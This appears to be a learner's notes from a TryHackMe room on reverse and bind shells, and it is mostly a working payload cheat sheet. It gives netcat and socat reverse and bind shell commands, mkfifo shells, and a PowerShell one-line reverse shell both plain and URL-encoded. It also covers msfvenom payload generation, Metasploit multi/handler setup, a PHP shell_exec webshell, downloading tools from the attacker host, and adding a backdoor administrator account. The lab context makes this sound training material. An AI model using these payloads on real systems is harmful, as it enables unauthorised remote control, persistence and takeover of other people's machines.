# PRIVILEGE ESCALATION 

## WHAT THE SHELL 

TOOLS 
- netcat
- socat
- metasploit -- multi/handler
> auxiliary/multi/handler 
- msfvenom

Aside from the tools we've already covered, there are some repositories of shells in many different languages 
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Kali ( PreInstalled) - `/usr/share/webshells`

**TYPES OF SHELL**

- Reverse Shell 
> Reverse shells are when the target is forced to execute code that connects back to your computer 
- Bind Shell 
> Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target.
> This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target

### TYPES OF SHELL 


**Reverse Shell**   
Nine times out of ten, this is what you'll be going for .


On the attacking machine:
```
sudo nc -lvnp 443
```

On the target:
```
nc <LOCAL-IP> <PORT> -e /bin/bash
```

**Bind Shell**  
Bind shells are less common, but still very useful.

On the target:
```
nc -lvnp <port> -e "cmd.exe"
```

On the attacking machine:
```
nc MACHINE_IP <port>
```

### NETCAT Shell Stabilisation 

**TECHNIQUE 1: python**  
The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

- The first thing to do is use **python -c 'import pty;pty.spawn("/bin/bash")'**, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace **python** with **python2** or **python3** as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
- Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
- Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

![nc](./media/9-nc-stabilize.png)

**TECHNIQUE 2: rlwrap**

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap.`

To use rlwrap, we invoke a slightly different listener:
```
rlwrap nc -lvnp <port>
```

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.


**TECHNIQUE 3: Socat**   
> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true 
> binary 

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

### SOCAT 

**REVERSE SHELL**  
Listener
```
socat TCP-L:<port> - 
# equivalent to nc -lvnp <port>
```

On windows to connect back:
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

On Linux 
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" 
```

**BIND SHELLS**
On Linux Target:
```
socat TCP-L:<PORT> EXEC:"bash -li"
```
On Windows 
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes 
```

on our attacking machine to connect to the waiting listener
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### SOCAT ENCRYPTED SHELLS 

```
# generate certificate 
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
# Merge both file to single pem file 
cat shell.key shell.crt > shell.pem

# Start socat listner 
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
# verify=0 don't validate certificate if not properly signed by authority 
# NOTE that the certificate must be used on whichever device is listening.

# To CONNECT back
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash 
```

For Binding Shell
```
# TARGET 
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# ATTACKER 
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:
![socat](./media/10-socat.png)

**ANSWERS**  
What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
```
# SIMPLE 
socal OPENSSL:10.10.10.5:53,verify=0 EXEC:/bin/bash
# CORRECT ANSWER 
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
> return for clarification and better notes

### COMMON SHELL PAYLOADS 

In Kali linux `/usr/share/windows-resources/binaries`
```
-rwxr-xr-x  1 root root  66560 Jul 17  2019 whoami.exe
-rwxr-xr-x  1 root root 308736 Jul 17  2019 wget.exe
-rwxr-xr-x  1 root root 364544 Jul 17  2019 vncviewer.exe
-rwxr-xr-x  1 root root 704512 Jul 17  2019 radmin.exe
-rwxr-xr-x  1 root root 311296 Jul 17  2019 plink.exe
-rwxr-xr-x  1 root root  59392 Jul 17  2019 nc.exe
-rwxr-xr-x  1 root root  23552 Jul 17  2019 klogger.exe
-rwxr-xr-x  1 root root  53248 Jul 17  2019 exe2bat.exe
drwxr-xr-x  2 root root   4096 Aug 17 05:13 mbenum
drwxr-xr-x  2 root root   4096 Aug 17 05:13 fport
drwxr-xr-x  2 root root   4096 Aug 17 05:13 fgdump
drwxr-xr-x  2 root root   4096 Aug 17 05:13 enumplus
drwxr-xr-x  4 root root   4096 Aug 17 05:13 nbtenum
drwxr-xr-x  7 root root   4096 Aug 17 05:13 .
drwxr-xr-x 14 root root   4096 Oct 26 14:33 ..
```

For NETCAT reverse shell  this will always work for windows  
`nc <LOCAL-IP> <PORT> -e /bin/bash`

for linux netcat that doesn't have `-e` we will manually create it by this command.  
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- The command first creates a named pipe at `/tmp/f`. 
- It then starts a netcat listener, and connects the input of the listener to the output of the named pipe
- The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`
- sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

one-line powershell reverse shell
```powershell 
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

For more common reverse shells:
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp 

### MSFVENOM 

```
msfvenom -p <payload> <options>
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

**Staged vs Stageless**  
- Staged payloads are sent in two parts 
>  a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
- Stageless payloads are more common
> these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

**PAYLOAD NAMING CONVENTIONS** 

`<OS>/<arch>/<payload>`
Example
`linux/x86/shell_reverse_tcp`

For a 64bit Windows target, the arch would be specified as normal (x64). 

Stageless payloads are denoted with underscores `_`.   
The staged equivalent to this payload would be:
`shell/reverse_tcp`

As staged payloads are denoted with another forward slash `/`

**NOTES**
```
uname -m # to know architecture
> x86_64 # means 64 bit
```

**EXAMPLE PAYLOADS WITH COMPARISON**
```
    linux/x86/meterpreter/bind_tcp                                     Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/reverse_tcp                                  Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter_reverse_tcp                                  Run the Meterpreter / Mettle server payload (stageless)

# / - means staged; two part payload will be listened by netcat or multi/handler
# _ - means stageless; will give you direct reverse shell 
```

**ANSWER THESE**
Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.
> msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.10.10 LPORT=4444 > win.exe

Which symbol is used to show that a shell is stageless?
> _

What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
> msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=10.10.10.5 LPORT=443 > shell 


### METASPLOIT MULTI/HANDLER

Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, it's relatively easy to use:
- msfconsole
- use multi/handler

Now we configure the listener
- options
- set PAYLOAD <payload>
> set PAYLOAD windows/x64/shell/reverse_tcp 
- set LHOST <YOUR IP>
> set LHOST 10.10.10.10
- set LPORT <CHOSEN PORT>
> set LPORT 4444
- exploit -j 
> makes it run as `job` in the background 


### WEBSHELLS 
> see https://tryhackme.com/room/uploadvulns for more info

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.
As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:
```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

![webshell](./media/10-php-webshell.png)




As mentioned previously, there are a variety of webshells available on Kali by default at `/usr/share/webshells` 
> Including the famouse Pentest Monkey php-reverse-shell
> https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

most generic written webshell are written for Linux webservers. they will not work on windows by default
When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

### ADDITIONAL 

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`
. These can be MD5 hashes or in plaintext, depending on the version.



Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
```
net user <username> <password> /add
net localgroup administrators <username> /add
```

**IMPORTANT TAKE AWAY**
Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

 
### PRACTICE AND EXAMPLES 
> return to this for fun and proper documentation. 


**ANSWERS 1 & 3**
netcat stabilization of shell 
![nc](./media/10-nc-stabilize.png)

ATTACKER VM 
```
nc -lvnp 4444


# ONCE THE VIM MACHINE CONNECTED VIA REVERSE SHELL 
# you have to stabilize NC to have an interactive shell
import python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# CTRL + Z 
stty raw -echo;fg # required  apt install coreutils
```

VICTIM  VM 
```
nc 10.10.93.13 4444 -e /bin/bash 
```


**BIND SHELL PRACTICE for netcat without -e**
```
PORT=4444
mkfifo /tmp/f; nc -lvnp $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
**REVERSE SHELL PRACTICE for netcat without -e**
```
IP=10.10.93.13
PORT=4444
mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```



**PENTEST MONKEY REV SHELL**
first change `/usr/share/webshells/php/php-reverse-shell.php` ip and port to your machine
![php](./media/10-php-revshell.png)


FOR WINDOWS
https://www.revshells.com/
PHP IVAN SINCEK 

received by nc
```
net user netcat netcat /add
net localgroup administrators netcat /add
```

now RDP to the windows server 
```
rdesktop -u netcat -p netcat 10.10.110.82
```

now testing ncat from windows
```
from /usr/share/windows-resources/ncat
ncat 10.10.10.179 4242 -e cmd
```

```
php = nc 
nc = nc 
Staged = multi/handler
stageless = nc

```

 TEST CASES 
 Linux 
php pentestmonkey = nc 












